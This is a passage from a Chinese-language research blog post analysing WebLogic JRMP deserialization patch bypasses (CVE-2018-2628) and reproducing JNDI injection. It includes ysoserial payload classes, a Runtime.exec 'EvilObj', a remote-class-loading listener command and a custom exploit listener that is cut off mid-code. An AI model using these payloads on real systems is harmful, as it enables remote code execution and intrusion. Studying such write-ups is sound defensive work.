<p>原漏洞作者绕过的方法是使用<code>java.rmi.activation.Activator</code>进行绕过，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" >CVE-2018-2628 简单复现与分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，但是实际上，在反序列化时，这个接口根本就没有什么用处，所以随便一个接口都可以绕过，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>比如上述<code>cL0und</code>师傅说的换成<code>Map</code>都可以的，如下代码所示</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Map</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><code>ysoserial</code>添加<code>payload</code></li>
</ul>
<p>这里再记录一下在<code>ysoserial</code>中添加<code>payload</code>。其实<code>git clone</code>下来用<code>IDEA</code>打开，等待<code>pom.xml</code>加载库，然后在<code>ysoserialsrc/main/java/ysoserial/payloads</code>中新建对应类放入即可，比如这里就放入<code>JRMPClient3</code>就行。最后再用如命令<code>mvn clean package -DskipTests</code>打包一下就能用。</p>
<p>接口是什么没有关系，实际上最本质的是<code>UnicastRef</code>这个对象就能建立远程连接并且获取信息。比如如下的<code>JRMPClient2</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRef</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRef <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>在实际的调用栈如下，也能完成利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209182117569.png" alt="image-20230209182117569"></p>
<p>此外由于<code>CVE-2017-3248</code>的补丁黑名单是添加到<code>resolveProxyClass</code>中，而对于<code>resolveProxyClass</code>而言，只要反序列化的对象没有<code>proxy</code>类的，那么<code>resolveProxyClass</code>就不会被调用到，那么其实只用<code>UnicastRef</code>的<code>payload</code>根本就不会碰到<code>CVE-2017-3248</code>的补丁黑名单过滤。</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479" >Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="漏洞修复-1"   >
          <a href="#漏洞修复-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3>
      <p>该<code>CVE-2018-2628</code>漏洞的修复最终添加的黑名单是<code>sun.rmi.server.UnicastRef</code>，放在<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>中。</p>
<p>但是该漏洞的修复并没有用，因为在<code>UnicastRef</code>经过<code>RemoteObjectInvocationHandler</code>的封装后，其序列化和反序列化过程是在<code>RemoteObjectInvocationHandler</code>父类<code>RemoteObject</code>的<code>readObject/writeObject</code>中完成的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209202440301.png" alt="image-20230209202440301"></p>
<p>所以当在<code>resovleClass</code>中获取类名尝试拦截时，获取到<code>RemoteObjectInvocationHandler</code>之后，下一个是获取不到<code>UnicastRef</code>的，因为<code>UnicastRef</code>已经在<code>RemoteObjectInvocationHandler</code>反序列化过程中完成了反序列化，所以该漏洞的补丁和没加一样的。</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479" >Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="疑问"   >
          <a href="#疑问" class="heading-link"><i class="fas fa-link"></i></a><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3>
      <p>在调试进行序列化和反序列化的时候，我尝试在本地进行，如下代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        String host = <span class="string">&quot;123.249.17.65&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">9999</span>;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(</span><br><span class="line">            myTest.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123;Registry.class&#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">        <span class="comment">//return ref;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> IOException, NotBoundException, ClassNotFoundException </span>&#123;</span><br><span class="line">        myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">        Registry testObj = test.getObject();</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;fileStream.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ObjectOutputStream 将 Java 对象的基本数据类型和图形写入 OutputStream。可以使用 ObjectInputStream 读取（重构）对象。</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//writeObject 方法负责写入特定类的对象状态，以便相应的 readObject 方法可以恢复它。</span></span><br><span class="line">        out.writeObject(testObj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//FileInputStream 类从文件系统中的一个文件中获取输入字节。</span></span><br><span class="line">        FileInputStream fin = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;fileStream.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建从指定 InputStream 读取的 ObjectInputStream。从流读取序列化头部并予以验证。</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fin);</span><br><span class="line">        Registry unSerObj = (Registry) in.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(testObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在开启了<code>JRMPListerner</code>之后，反序列化的过程中并没有命令执行，经过调试，最终也会走入到<code>executeCall</code>方法，但是总是没办法接收到远程的数据，而远程显示已经发送的数据，但是就是接收不到，不知道为什么。实际的调用栈其实也差不多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209183545852.png" alt="image-20230209183545852"></p>
<p>在本地调试时也会进入到<code>executeCall#var14 = this.in.readObject();</code></p>
<p>但是反序列化得到的结果不是想要的，水平比较菜，也没有找到反序列化的数据在哪里。寄寄。</p>
<p>但是实际上，如果在上述代码最后加上一个远程通信代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unSerObj.list();</span><br></pre></td></tr></table></div></figure>

<p>这样就可以得到命令执行，同样也是在<code>executeCall#var14 = this.in.readObject();</code>进行的反序列化得到命令执行，有点整不会了。<strong>mark一下</strong></p>

        <h2 id="JNDI注入"   >
          <a href="#JNDI注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2>
      <p>学到<code>Weblogic</code>的一些洞，发现其中的<code>JNDI</code>注入<code>(Java Naming and Directory Interface)</code>挺有意思，就来复现一下。</p>
<p>首先以<code>java1.6.0_45</code>为例子，比较原始一点，不涉及之后<code>JAVA</code>版本对于<code>JNDI</code>注入的一些限制</p>

        <h3 id="简单例子"   >
          <a href="#简单例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3>
      <p>做个简单<code>JNDI</code>的运行例子，画一下图更加清楚一点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230210201304085.png" alt="image-20230210201304085"></p>

        <h4 id="server-register"   >
          <a href="#server-register" class="heading-link"><i class="fas fa-link"></i></a><a href="#server-register" class="headerlink" title="server/register"></a>server/register</h4>
      <p>直接就放在一起了，用<code>wh1t3p1g</code>师傅改版后的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial" >ysoserial</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://LDAP_IP/</span><br></pre></td></tr></table></div></figure>

<p>这个<code>EvilObj</code>即代表在<code>LDAP</code>服务中的<code>EvilObj.class</code>，随便写点恶意代码就行</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199481#h3-9" >JNDI with RMI-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObj</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>javac</code>编译生成的<code>EvilObj.class</code>，放在<code>LDAP</code>服务目录下即可</p>

        <h4 id="LDAP服务"   >
          <a href="#LDAP服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDAP服务" class="headerlink" title="LDAP服务"></a>LDAP服务</h4>
      <p>这个直接开启<code>Web</code>服务就行，比如用<code>Python</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></div></figure>

<p>然后<code>Web</code>目录下得有上述的<code>EvilObj.class</code>，即<code>http://LDAP_IP/EvilObj.class</code>得访问下载到才行。</p>
<p>当然这个<code>LDAP</code>服务和上面的<code>server</code>放一起也行，用<code>wh1t3p1g</code>师傅改版后的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial" >ysoserial</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>同样可以完成，但是师傅可能更改了一些代码，现在不太好使，也可能是自己方法不对。这里就自己写了一下，借助一下师傅的<code>PayloadClassFileHTTPServer</code>类，然后整合一下放到<code>ysoserial.exploit</code>里面就行</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.exploit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UID;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic JRMP listener</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span></span><br><span class="line"><span class="comment"> * client connecting to it and making a call.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIRefWithHttpServerListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(  String[] args )</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">            System.err.println(RMIRefWithHttpServerListener.class.getName() + <span class="string">&quot;&lt;registryHost:registryPort&gt; &lt;PayloadServerPort&gt; &lt;factory_name&gt; &lt;command&gt;&quot;</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;sun.rmi.transport.tcp.logLevel&quot;</span>,<span class="string">&quot;BRIEF&quot;</span>);</span><br><span class="line">        String[] registry = args[<span class="number">0</span>].split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> registryPort = Integer.parseInt(registry[<span class="number">1</span>]);</span><br><span class="line">        String host = registry[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> httpServerPort = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        String factoryURL = <span class="string">&quot;http://&quot;</span>+host+<span class="string">&quot;:&quot;</span>+httpServerPort+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        String factoryName = args[<span class="number">2</span>];</span><br><span class="line">        String command = args[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        int registryPort = 9999;</span></span><br><span class="line"><span class="comment">//        String host = &quot;localhost&quot;;</span></span><br><span class="line"><span class="comment">//        int httpServerPort = 80;</span></span><br><span class="line"><span class="comment">//        String factoryName = &quot;EvilObj&quot;;</span></span><br><span class="line"><span class="comment">//        String factoryURL = &quot;http://&quot;+host+&quot;:&quot;+httpServerPort+&quot;/&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        String command = &quot;touch aaa&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(factoryName,factoryName,factoryURL);</span><br><span class="line">        <span class="keyword">final</span> Object payloadObject = <span class="keyword">new</span> 